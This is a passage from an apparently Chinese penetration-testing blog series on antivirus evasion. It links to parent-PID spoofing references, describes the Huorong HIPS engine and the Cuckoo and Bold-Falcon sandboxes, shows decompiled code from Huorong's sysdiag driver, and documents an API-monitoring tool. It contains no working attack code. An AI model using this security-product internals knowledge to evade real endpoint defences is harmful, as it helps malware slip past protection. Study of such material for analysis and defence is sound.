href="https://gist.github.com/xpn/a057a26ec81e736518ee50848b9c2cd6">https://gist.github.com/xpn/a057a26ec81e736518ee50848b9c2cd6</a><br><a href="https://decoder.cloud/2018/02/02/getting-system/">https://decoder.cloud/2018/02/02/getting-system/</a><br><a href="https://blog.f-secure.com/detecting-parent-pid-spoofing/">https://blog.f-secure.com/detecting-parent-pid-spoofing/</a><br><a href="https://web.archive.org/web/20190526132859/http://www.pwncode.club/2018/08/macro-used-to-spoof-parent-process.html">https://web.archive.org/web/20190526132859/http://www.pwncode.club/2018/08/macro-used-to-spoof-parent-process.html</a><br><a href="https://www.anquanke.com/post/id/168618">https://www.anquanke.com/post/id/168618</a><br><a href="https://medium.com/@r3n_hat/parent-pid-spoofing-b0b17317168e">https://medium.com/@r3n_hat/parent-pid-spoofing-b0b17317168e</a><br><a href="https://rastamouse.me/tags/tikitorch/">https://rastamouse.me/tags/tikitorch/</a><br><a href="https://github.com/rasta-mouse/TikiTorch">https://github.com/rasta-mouse/TikiTorch</a><br><a href="#file-createwithparentprocess-cpp">https://gist.github.com/christophetd/0c44fd5e16e352ad924f98620094cd8d#file-createwithparentprocess-cpp</a><br><a href="https://blog.christophetd.fr/building-an-office-macro-to-spoof-process-parent-and-command-line/">https://blog.christophetd.fr/building-an-office-macro-to-spoof-process-parent-and-command-line/</a><br><a href="https://blog.f-secure.com/dechaining-macros-and-evading-edr/">https://blog.f-secure.com/dechaining-macros-and-evading-edr/</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/40-mian-sha/bi-ji-1.6-an-quan-ruan-jian-fen-xi-si-wei-dao-xiang-xia/"/>
      <url>/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/40-mian-sha/bi-ji-1.6-an-quan-ruan-jian-fen-xi-si-wei-dao-xiang-xia/</url>
      
        <content type="html"><![CDATA[<h2 id="火绒HIPS引擎架构-一）"><a href="#火绒HIPS引擎架构-一）" class="headerlink" title="火绒HIPS引擎架构(一）"></a>火绒HIPS引擎架构(一）</h2><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1650329323093/5270d5e5a89448318f2bc649397fef03.png" alt="image.png"><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1650329323093/5eca05cc96ed42e49d8e85df62a002df.png" alt="image.png"></p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1650329323093/d2cba453b6364f19b41a7491b93ee242.png" alt="image.png"></p><p>亮点虚拟沙箱技术：</p><p>Cuckoo沙箱是一个自动化的恶意样本分析系统。通过web界面或者沙箱系统提供的web api提交可疑文件，沙箱系统即可自动分析，并在分析完毕后提供一个详细的报告，概述该文件在沙箱中执行时的行为。</p><h3 id="架构与流程"><a href="#架构与流程" class="headerlink" title="架构与流程"></a>架构与流程</h3><p>Cuckoo由Cuckoo host、Analysis Guests、Virtual network构成。cuckoo host是调度中心，analysis guest是具体执行样本的沙箱环境，两者通过虚拟网卡连接。当提交样本到cuckoo host后，cuckoo host会调度一个空闲的analysis guest节点，同时将样本传递给所选择的沙箱节点进行自动化分析，分析结束之后将沙箱节点采集到的分析数据进行汇总，最后输出分析报告。</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1650329323093/1733a62c4f5b449d9689be42572ae5ed.png" alt="image.png"></p><p>cuckoo沙箱底层基于虚拟化技术，可以使用不同的虚拟化平台进行构建，目前支持的虚拟化平台包括：VirtualBox、KVM、VMware Workstation、XenServer。</p><h2 id="火绒HIPS引擎架构沙箱源码-二）"><a href="#火绒HIPS引擎架构沙箱源码-二）" class="headerlink" title="火绒HIPS引擎架构沙箱源码(二）"></a>火绒HIPS引擎架构沙箱源码(二）</h2><p><a href="https://github.com/huoji120/DuckSandboxDetect">https://github.com/huoji120/DuckSandboxDetect</a></p><h4 id="毕方智能云沙箱"><a href="#毕方智能云沙箱" class="headerlink" title="毕方智能云沙箱"></a>毕方智能云沙箱</h4><p>毕方智能云沙箱( <em><strong>Bold-Falcon</strong></em> )是一个开源的自动化恶意软件分析系统。它用于自动运行和分析文件，并收集全面的分析结果，概述恶意软件在独立操作系统中运行时所做的工作。我们的工作是二次开发开源cuckoo沙箱，包括 <strong>更新项目结构</strong> ，<strong>重写整个前端的用户交互</strong>和 <strong>添加基于机器学习的检测模块</strong> ， 使恶意软件分析系统可以 <strong>思考</strong> 。</p><p><strong><code>说明文档</code></strong> <a href="https://powerlzy.github.io/Bold-Falcon/">https://powerlzy.github.io/Bold-Falcon/</a></p><p><strong><code>开发文档</code></strong> <a href="https://boldfalcon.readthedocs.io/">https://boldfalcon.readthedocs.io</a></p><h4 id="下载源码"><a href="#下载源码" class="headerlink" title="下载源码"></a>下载源码</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">git</span> clone https://github.com/PowerLZY/Bold-Falcon<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ pip <span class="token function">install</span> Bold-Falcon<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="开源资料"><a href="#开源资料" class="headerlink" title="开源资料"></a>开源资料</h4><ul><li><a href="https://github.com/cuckoosandbox/cuckoo">cuckoo</a> Cuckoo Sandbox is an automated dynamic malware analysis system</li><li><a href="https://github.com/spender-sandbox/cuckoo-modified">cuckoo-modified</a> Modified edition of cuckoo</li><li><a href="https://github.com/idanr1986/cuckoo-droid">cuckooDroid</a> CuckooDroid - Automated Android Malware Analysis with Cuckoo Sandbox.</li><li><a href="https://github.com/blacktop/docker-cuckoo">docker-cuckoo</a> Cuckoo Sandbox Dockerfile</li><li><a href="https://github.com/buguroo/cuckooautoinstall">cuckooautoinstall</a> Auto Installer Script for Cuckoo Sandbox</li><li><a href="https://github.com/honeynet/cuckooml">cuckooML</a> CuckooML: Machine Learning for Cuckoo Sandbox</li><li><a href="https://github.com/PowerLZY/Panda-Sandbox">Panda-Sandbox</a> Cuckoo python3 (Unfinished)</li><li><a href="https://github.com/Tencent/HaboMalHunter#readme_cn">HaboMalHunter</a> HaboMalHunter is a sub-project of Habo Malware Analysis System</li></ul><h4 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h4><ul><li><a href="https://cloud.tencent.com/developer/article/1597020">cuckoo技术分析全景图</a></li><li><a href="https://bbs.pediy.com/thread-260038.htm">cuckoo沙箱源码分析上</a></li><li><a href="https://bbs.pediy.com/thread-260087.htm">cuckoo沙箱源码分析中</a></li><li><a href="https://bbs.pediy.com/thread-260252.htm">cuckoo沙箱源码分析后</a></li><li><a href="https://zhuanlan.zhihu.com/p/54756592">腾讯哈勃Linux沙箱源码分析上</a></li><li><a href="https://zhuanlan.zhihu.com/p/54756845">腾讯哈勃Linux沙箱源码分析下</a></li></ul><h2 id="逆向火绒安全软件驱动sysdiag（一）"><a href="#逆向火绒安全软件驱动sysdiag（一）" class="headerlink" title="逆向火绒安全软件驱动sysdiag（一）"></a>逆向火绒安全软件驱动sysdiag（一）</h2><h4 id="简单概述-DriverEntry"><a href="#简单概述-DriverEntry" class="headerlink" title="简单概述 DriverEntry:"></a>简单概述 <code>DriverEntry</code>:</h4><ol><li>排除xp以下版本</li><li>获取当前正在运行的操作系统例程返回版本信息</li><li>初始化6个Ndis读写锁</li><li>初始化2个资源变量</li><li>注册卸载和分发函数</li></ol><pre class="line-numbers language-none"><code class="language-none">NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT  DriverObject , _In_ PUNICODE_STRING RegistryPath) {    NTSTATUS status = 0; #ifdef DBG    __debugbreak();    PRINT_INFO;#else    PRINT_INFO;#endif // DBG     //  不支持xp以下版本    if ((USHORT)NtBuildNumber &lt; 0xa28) {        return 0xC00000BB;    }     g_sysdiag.v_580 = &amp;g_sysdiag.v_580;    g_sysdiag.v_588 = &amp;g_sysdiag.v_580;    g_sysdiag.v_dd8 = &amp;g_sysdiag.v_dd8;    g_sysdiag.v_de0 = &amp;g_sysdiag.v_dd8;    g_sysdiag.v_1208 = &amp;g_sysdiag.v_1208;    g_sysdiag.v_1210 = &amp;g_sysdiag.v_1208;    g_sysdiag.v_1638 = &amp;g_sysdiag.v_1638;    g_sysdiag.v_1640 = &amp;g_sysdiag.v_1638;    g_sysdiag.v_1a68 = &amp;g_sysdiag.v_1a68;    g_sysdiag.v_1a70 = &amp;g_sysdiag.v_1a68;    g_sysdiag.v_1e90 = &amp;g_sysdiag.v_1e90;    g_sysdiag.v_1e98 = &amp;g_sysdiag.v_1e90;    g_sysdiag.v_1ea0 = &amp;g_sysdiag.v_1ea0;    g_sysdiag.v_1ea8 = &amp;g_sysdiag.v_1ea0;    g_sysdiag.v_1eb0 = &amp;g_sysdiag.v_1eb0;    g_sysdiag.v_1eb8 = &amp;g_sysdiag.v_1eb0;      //获取当前正在运行的操作系统例程返回版本信息    //初始化6个读写锁    //初始化2个资源变量。    g_sysdiag.rtl_osversioninfoexw.dwOSVersionInfoSize = sizeof(RTL_OSVERSIONINFOEXW);    if (RtlGetVersion((PRTL_OSVERSIONINFOW) &amp;g_sysdiag.rtl_osversioninfoexw) &lt; 0)        return 0xC0000001;    NdisInitializeReadWriteLock(&amp;g_sysdiag.ndis_rw_lock_168);    g_sysdiag.nrl_flag_160.flag_0 |= 3u;    if (!(g_sysdiag.nrl_flag_160.flag_0 &amp; 1))        return 0xC0000001;    NdisInitializeReadWriteLock(&amp;g_sysdiag.ndis_rw_lock_598);    g_sysdiag.nrl_flag_590.flag_0 |= 3u;    if (!(g_sysdiag.nrl_flag_590.flag_0 &amp; 1))        return 0xC0000001;    g_sysdiag.eres_flag_9b8.flag_0 &amp;= 0xFDu;    g_sysdiag.eres_flag_9b8.flag_0 = g_sysdiag.eres_flag_9b8.flag_0 &amp; 0xFE | (ExInitializeResourceLite(&amp;g_sysdiag.eresource_9c0) &gt;= 0);    if (!(g_sysdiag.eres_flag_9b8.flag_0 &amp; 1))        return 0xC0000001;    NdisInitializeReadWriteLock(&amp;g_sysdiag.ndis_rw_lock_df0);    g_sysdiag.nrl_flag_de8.flag_0 |= 3u;    if (!(g_sysdiag.nrl_flag_de8.flag_0 &amp; 1))        return 0xC0000001;    NdisInitializeReadWriteLock(&amp;g_sysdiag.ndis_rw_lock_1220);    g_sysdiag.nrl_flag_1218.flag_0 |= 3u;    if (!(g_sysdiag.nrl_flag_1218.flag_0 &amp; 1))        return 0xC0000001;    NdisInitializeReadWriteLock(&amp;g_sysdiag.ndis_rw_lock_1658);    g_sysdiag.nrl_flag_1650.flag_0 |= 3u;    if (!(g_sysdiag.nrl_flag_1650.flag_0 &amp; 1))        return 0xC0000001;    g_sysdiag.eres_flag_1a78.flag_0 &amp;= 0xFDu;    g_sysdiag.eres_flag_1a78.flag_0 = g_sysdiag.eres_flag_1a78.flag_0 &amp; 0xFE | (ExInitializeResourceLite(&amp;g_sysdiag.eresource_1a80) &gt;= 0);    if (!(g_sysdiag.eres_flag_1a78.flag_0 &amp; 1))        return 0xC0000001;    NdisInitializeReadWriteLock(&amp;g_sysdiag.ndis_rw_lock_1ec8);    g_sysdiag.nrl_flag_1ec0.flag_0 |= 3u;    if (!(g_sysdiag.nrl_flag_1ec0.flag_0 &amp; 1))        return 0xC0000001;     g_sysdiag.pdriver_object_8 = DriverObject;    g_sysdiag.ppdriver_object_0 = &amp;DriverObject;      PINIT_LIST list = g_LT;    int IoRegister_flag = 0;    int unload_flag = 1;    if (list) {        for (; list-&gt;pnext_list;) {            status = list-&gt;pnext_ft-&gt;subA(list-&gt;pnext_ft , DriverObject , RegistryPath);            if (status &lt; 0) {                //退出清理                hr_ExitCleaner(DriverObject);                return unload_flag ? status : 0;            }            IoRegister_flag = list-&gt;pnext_ft-&gt;v_10 ? 1 : IoRegister_flag;            unload_flag = list-&gt;pnext_ft-&gt;subB ? unload_flag : 0;            list = list-&gt;pnext_list;        }    }     for (int i = 0; i &lt; 28; i++) {        DriverObject-&gt;MajorFunction[i] = hr_driver_dispatch;    }    if (unload_flag) {        DriverObject-&gt;DriverUnload = hr_driver_unload;    }    if (IoRegister_flag) {        IoRegisterBootDriverReinitialization(DriverObject , hr_BootDriverReinitialization , (PVOID) 0x424F4F54);        IoRegisterDriverReinitialization(DriverObject , hr_DriverReinitialization , NULL);    }    g_sysdiag.ppdriver_object_0 = NULL;    return status;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="深度解析反病毒工程师的利器（二）"><a href="#深度解析反病毒工程师的利器（二）" class="headerlink" title="深度解析反病毒工程师的利器（二）"></a>深度解析反病毒工程师的利器（二）</h2><p><a href="https://github.com/PowerLZY/Bold-Falcon">https://github.com/PowerLZY/Bold-Falcon</a></p><h1 id="Navy-public"><a href="#Navy-public" class="headerlink" title="Navy_public"></a>Navy_public</h1><p>轻量级自动分析病毒程序调用上下文、游戏反调试实现技术…</p><h4 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h4><ol><li>启动 <code>Navy32/64.EXE</code> 按 <code>alt+a</code>选择要监控的进程 <a href="https://user-images.githubusercontent.com/16742566/80297988-25bd0480-87bb-11ea-9357-18460725856e.png"><img src="https://user-images.githubusercontent.com/16742566/80297988-25bd0480-87bb-11ea-9357-18460725856e.png" alt="image"></a></li></ol><h4 id="快捷键"><a href="#快捷键" class="headerlink" title="快捷键"></a>快捷键</h4><ul><li><code>ALT + A</code>: 打开进程列表</li><li><code>CTRL + L</code>: 清屏</li></ul><h4 id="json数据库"><a href="#json数据库" class="headerlink" title="json数据库"></a>json数据库</h4><ol><li>示例</li></ol><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span>    <span class="token property">"supportedFunctions"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">"NtCreateProcess"</span><span class="token punctuation">,</span> <span class="token string">"NtQueryInformationProcess"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token comment">// 数据库已支持函数（数据库未支持的未显示在gui</span>    <span class="token property">"NtCreateProcess"</span><span class="token operator">:</span> <span class="token punctuation">{</span>        <span class="token property">"hasResult"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token comment">// 函数是否有返回值</span>        <span class="token property">"paraCount"</span><span class="token operator">:</span> <span class="token number">8</span><span class="token punctuation">,</span> / 函数参数个数（不包括返回值）        <span class="token property">"paras"</span><span class="token operator">:</span> <span class="token punctuation">{</span>            <span class="token property">"para0"</span><span class="token operator">:</span> <span class="token punctuation">{</span> <span class="token comment">// 函数返回结果（若无也需要保留该字段</span>                <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"NSTATUS"</span><span class="token punctuation">,</span> <span class="token comment">// 类型</span>                <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"result"</span><span class="token punctuation">,</span> <span class="token comment">// 名称</span>                <span class="token property">"hasPreValue"</span><span class="token operator">:</span> <span class="token boolean">false</span> <span class="token comment">// 是否有预定义值 可参考`DB/NTDLL.JSON -&gt; NtQueryInformationProcess`</span>            <span class="token punctuation">}</span><span class="token punctuation">,</span>            <span class="token property">"para1"</span><span class="token operator">:</span> <span class="token punctuation">{</span><span class="token comment">// 第一个参数</span>                <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"PHANDLE"</span><span class="token punctuation">,</span>                <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"ProcessHandle"</span><span class="token punctuation">,</span>                <span class="token property">"hasPreValue"</span><span class="token operator">:</span> <span class="token boolean">false</span>            <span class="token punctuation">}</span><span class="token punctuation">,</span>            <span class="token property">"para2"</span><span class="token operator">:</span> <span class="token punctuation">{</span> <span class="token comment">// 第二个参数</span>                <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"ACCESS_MASK"</span><span class="token punctuation">,</span>                <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"DesiredAccess"</span><span class="token punctuation">,</span>                <span class="token property">"hasPreValue"</span><span class="token operator">:</span> <span class="token boolean">false</span>            <span class="token punctuation">}</span><span class="token punctuation">,</span>            <span class="token property">"para3"</span><span class="token operator">:</span> <span class="token punctuation">{</span>                <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"POBJECT_ATTRIBUTES"</span><span class="token punctuation">,</span>                <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"ObjectAttributes"</span><span class="token punctuation">,</span>                <span class="token property">"hasPreValue"</span><span class="token operator">:</span> <span class="token boolean">false</span>            <span class="token punctuation">}</span><span class="token punctuation">,</span>            <span class="token property">"para4"</span><span class="token operator">:</span> <span class="token punctuation">{</span>                <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"HANDLE"</span><span class="token punctuation">,</span>                <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"ParentProcess"</span><span class="token punctuation">,</span>                <span class="token property">"hasPreValue"</span><span class="token operator">:</span> <span class="token boolean">false</span>            <span class="token punctuation">}</span><span class="token punctuation">,</span>            <span class="token property">"para5"</span><span class="token operator">:</span> <span class="token punctuation">{</span>                <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"BOOLEAN"</span><span class="token punctuation">,</span>                <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"InheritObjectTable"</span><span class="token punctuation">,</span>                <span class="token property">"hasPreValue"</span><span class="token operator">:</span> <span class="token boolean">false</span>            <span class="token punctuation">}</span><span class="token punctuation">,</span>            <span class="token property">"para6"</span><span class="token operator">:</span> <span class="token punctuation">{</span>                <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"HANDLE"</span><span class="token punctuation">,</span>                <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"SectionHandle"</span><span class="token punctuation">,</span>                <span class="token property">"hasPreValue"</span><span class="token operator">:</span> <span class="token boolean">false</span>            <span class="token punctuation">}</span><span class="token punctuation">,</span>            <span class="token property">"para7"</span><span class="token operator">:</span> <span class="token punctuation">{</span>                <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"HANDLE"</span><span class="token punctuation">,</span>                <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"DebugPort"</span><span class="token punctuation">,</span>                <span class="token property">"hasPreValue"</span><span class="token operator">:</span> <span class="token boolean">false</span>            <span class="token punctuation">}</span><span class="token punctuation">,</span>            <span class="token property">"para8"</span><span class="token operator">:</span> <span class="token punctuation">{</span>                <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"HANDLE"</span><span class="token punctuation">,</span>                <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"ExceptionPort"</span><span class="token punctuation">,</span>                <span class="token property">"hasPreValue"</span><span class="token operator">:</span> <span class="token boolean">false</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="3"><li>如果有数据显示类似以下结果</li></ol><blockquote><p>函数返回类型 函数结果名称(原值/预定义值(若已设置)) 调用类型 (参数返回类型 参数名称(原值/预定义值(若已设置))[预定义注释], …)</p></blockquote><p>3.1  <em>调用前</em> ：未调用 <code>NtQueryInformationProcess</code>时参数的内容</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">NSTATUS result(无返回值) __stdcall (HANDLE ProcessHandle(0xffffffff), PROCESSINFOCLASS ProcessInformationClass(ProcessBasicInformation)[there is any comments], PVOID ProcessInformation(0x695198), ULONG ProcessInformationLength(0x18), PULONG ReturnLength(0x6951b0))<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3.2  <em>调用后</em> ：调用 <code>NtQueryInformationProcess</code>后参数的内容</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">NSTATUS result(0x0) __stdcall (HANDLE ProcessHandle(0xffffffff), PROCESSINFOCLASS ProcessInformationClass(ProcessBasicInformation)[there is any comments], PVOID ProcessInformation(0x695198), ULONG ProcessInformationLength(0x18), PULONG ReturnLength(0x6951b0))<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="已支持函数"><a href="#已支持函数" class="headerlink" title="已支持函数"></a>已支持函数</h4><ul><li><p><em>ntdll.dll</em></p></li><li><p><input checked="" disabled="" type="checkbox"> NtCreateProcess</p></li><li><p><input checked="" disabled="" type="checkbox"> NtCreateProcessEx</p></li><li><p><input checked="" disabled="" type="checkbox"> NtOpenProcess</p></li><li><p><input checked="" disabled="" type="checkbox"> NtTerminateProcess</p></li><li><p><input checked="" disabled="" type="checkbox"> NtSuspendProcess</p></li><li><p><input checked="" disabled="" type="checkbox"> NtResumeProcess</p></li><li><p><input checked="" disabled="" type="checkbox"> NtQueryInformationProcess</p></li><li><p><input checked="" disabled="" type="checkbox"> NtGetNextProcess</p></li><li><p><input checked="" disabled="" type="checkbox"> NtGetNextThread</p></li><li><p><input checked="" disabled="" type="checkbox"> NtSetInformationProcess</p></li><li><p><input checked="" disabled="" type="checkbox"> NtQueryPortInformationProcess</p></li><li><p><input checked="" disabled="" type="checkbox"> NtCreateThread</p></li><li><p><input checked="" disabled="" type="checkbox"> NtOpenThread</p></li><li><p><input checked="" disabled="" type="checkbox"> NtTerminateThread</p></li><li><p><input checked="" disabled="" type="checkbox"> NtSuspendThread</p></li><li><p><input checked="" disabled="" type="checkbox"> NtResumeThread</p></li><li><p><input checked="" disabled="" type="checkbox"> NtGetCurrentProcessorNumber</p></li><li><p><input checked="" disabled="" type="checkbox"> NtGetContextThread</p></li><li><p><input checked="" disabled="" type="checkbox"> NtSetContextThread</p></li><li><p><input checked="" disabled="" type="checkbox"> NtQueryInformationThread</p></li><li><p><input checked="" disabled="" type="checkbox"> NtSetInformationThread</p></li><li><p><input checked="" disabled="" type="checkbox"> NtAlertThread</p></li><li><p><input checked="" disabled="" type="checkbox"> NtAlertResumeThread</p></li><li><p><input checked="" disabled="" type="checkbox"> NtImpersonateThread</p></li><li><p><input checked="" disabled="" type="checkbox"> NtTestAlert</p></li><li><p><input checked="" disabled="" type="checkbox"> NtRegisterThreadTerminatePort</p></li><li><p><input checked="" disabled="" type="checkbox"> NtSetLdtEntries</p></li><li><p><input checked="" disabled="" type="checkbox"> NtQueueApcThread</p></li><li><p><input checked="" disabled="" type="checkbox"> NtQueueApcThreadEx</p></li><li><p><input checked="" disabled="" type="checkbox"> NtCreateUserProcess</p></li><li><p><input checked="" disabled="" type="checkbox"> NtCreateThreadEx</p></li><li><p><input checked="" disabled="" type="checkbox"> NtOpenJobObject</p></li><li><p><input checked="" disabled="" type="checkbox"> NtCreateJobObject</p></li><li><p><input checked="" disabled="" type="checkbox"> NtAssignProcessToJobObject</p></li><li><p><input checked="" disabled="" type="checkbox"> NtTerminateJobObject</p></li><li><p><input checked="" disabled="" type="checkbox"> NtIsProcessInJob</p></li><li><p><input checked="" disabled="" type="checkbox"> NtQueryInformationJobObject</p></li><li><p><input checked="" disabled="" type="checkbox"> NtSetInformationJobObject</p></li><li><p><input checked="" disabled="" type="checkbox"> NtCreateJobSet</p></li><li><p><input checked="" disabled="" type="checkbox"> NtCreateFile</p></li><li><p><input checked="" disabled="" type="checkbox"> NtCreateNamedPipeFile</p></li><li><p><input checked="" disabled="" type="checkbox"> NtCreateMailslotFile</p></li><li><p><input checked="" disabled="" type="checkbox"> NtOpenFile</p></li><li><p><input checked="" disabled="" type="checkbox"> NtDeleteFile</p></li><li><p><input checked="" disabled="" type="checkbox"> NtFlushBuffersFile</p></li><li><p><input checked="" disabled="" type="checkbox"> NtQueryInformationFile</p></li><li><p><input checked="" disabled="" type="checkbox"> NtSetInformationFile</p></li><li><p><input checked="" disabled="" type="checkbox"> NtQueryDirectoryFile</p></li><li><p><input checked="" disabled="" type="checkbox"> NtQueryEaFile</p></li><li><p><input checked="" disabled="" type="checkbox"> NtSetEaFile</p></li><li><p><input checked="" disabled="" type="checkbox"> NtQueryQuotaInformationFile</p></li><li><p><input checked="" disabled="" type="checkbox"> NtSetQuotaInformationFile</p></li><li><p><input checked="" disabled="" type="checkbox"> NtQueryVolumeInformationFile</p></li><li><p><input checked="" disabled="" type="checkbox"> NtSetVolumeInformationFile</p></li><li><p><input checked="" disabled="" type="checkbox"> NtCancelIoFile</p></li><li><p><input checked="" disabled="" type="checkbox"> NtCancelIoFileEx</p></li><li><p><input checked="" disabled="" type="checkbox"> NtCancelSynchronousIoFile</p></li><li><p><input checked="" disabled="" type="checkbox"> NtDeviceIoControlFile</p></li><li><p><input checked="" disabled="" type="checkbox"> NtFsControlFile</p></li><li><p><input checked="" disabled="" type="checkbox"> NtReadFile</p></li><li><p><input checked="" disabled="" type="checkbox"> NtWriteFile</p></li><li><p><input checked="" disabled="" type="checkbox"> NtReadFileScatter</p></li><li><p><input checked="" disabled="" type="checkbox"> NtWriteFileGather</p></li><li><p><input checked="" disabled="" type="checkbox"> NtLockFile</p></li><li><p><input checked="" disabled="" type="checkbox"> NtUnlockFile</p></li><li><p><input checked="" disabled="" type="checkbox"> NtQueryAttributesFile</p></li><li><p><input checked="" disabled="" type="checkbox"> NtQueryFullAttributesFile</p></li><li><p><input checked="" disabled="" type="checkbox"> NtNotifyChangeDirectoryFile</p></li><li><p><input checked="" disabled="" type="checkbox"> NtLoadDriver</p></li><li><p><input checked="" disabled="" type="checkbox"> NtUnloadDriver</p></li><li><p><input checked="" disabled="" type="checkbox"> NtCreateIoCompletion</p></li><li><p><input checked="" disabled="" type="checkbox"> NtOpenIoCompletion</p></li><li><p><input checked="" disabled="" type="checkbox"> NtQueryIoCompletion</p></li><li><p><input checked="" disabled="" type="checkbox"> NtSetIoCompletion</p></li><li><p><input checked="" disabled="" type="checkbox"> NtSetIoCompletionEx</p></li><li><p><input checked="" disabled="" type="checkbox"> NtRemoveIoCompletion</p></li><li><p><input checked="" disabled="" type="checkbox"> NtRemoveIoCompletionEx</p></li><li><p><input checked="" disabled="" type="checkbox"> NtAllocateVirtualMemory</p></li><li><p><input checked="" disabled="" type="checkbox"> NtFreeVirtualMemory</p></li><li><p><input checked="" disabled="" type="checkbox"> NtReadVirtualMemory</p></li><li><p><input checked="" disabled="" type="checkbox"> NtWriteVirtualMemory</p></li><li><p><input checked="" disabled="" type="checkbox"> NtProtectVirtualMemory</p></li><li><p><input checked="" disabled="" type="checkbox"> NtQueryVirtualMemory</p></li><li><p><input checked="" disabled="" type="checkbox"> NtLockVirtualMemory</p></li><li><p><input checked="" disabled="" type="checkbox"> NtUnlockVirtualMemory</p></li><li><p><input checked="" disabled="" type="checkbox"> NtCreateSection</p></li><li><p><input checked="" disabled="" type="checkbox"> NtOpenSection</p></li><li><p><input checked="" disabled="" type="checkbox"> NtMapViewOfSection</p></li><li><p><input checked="" disabled="" type="checkbox"> NtUnmapViewOfSection</p></li><li><p><input checked="" disabled="" type="checkbox"> NtExtendSection</p></li><li><p><input checked="" disabled="" type="checkbox"> NtQuerySection</p></li><li><p><input checked="" disabled="" type="checkbox"> NtAreMappedFilesTheSame</p></li><li><p><input checked="" disabled="" type="checkbox"> NtMapUserPhysicalPages</p></li><li><p><input checked="" disabled="" type="checkbox"> NtMapUserPhysicalPagesScatter</p></li><li><p><input checked="" disabled="" type="checkbox"> NtAllocateUserPhysicalPages</p></li><li><p><input checked="" disabled="" type="checkbox"> NtFreeUserPhysicalPages</p></li><li><p><input checked="" disabled="" type="checkbox"> NtOpenSession</p></li><li><p><input checked="" disabled="" type="checkbox"> NtGetWriteWatch</p></li><li><p><input checked="" disabled="" type="checkbox"> NtResetWriteWatch</p></li><li><p><input checked="" disabled="" type="checkbox"> NtCreatePagingFile</p></li><li><p><input checked="" disabled="" type="checkbox"> NtFlushInstructionCache</p></li><li><p><input checked="" disabled="" type="checkbox"> NtFlushWriteBuffer</p></li><li><p><input checked="" disabled="" type="checkbox"> NtCreateEnclave</p></li><li><p><input checked="" disabled="" type="checkbox"> NtLoadEnclaveData</p></li><li><p><input checked="" disabled="" type="checkbox"> NtInitializeEnclave</p></li><li><p><input checked="" disabled="" type="checkbox"> NtTerminateEnclave</p></li><li><p><input checked="" disabled="" type="checkbox"> NtCallEnclave</p></li></ul><h4 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h4><p><a href="https://user-images.githubusercontent.com/16742566/80297627-6a46a100-87b7-11ea-963d-52a59eb95b0a.png"><img 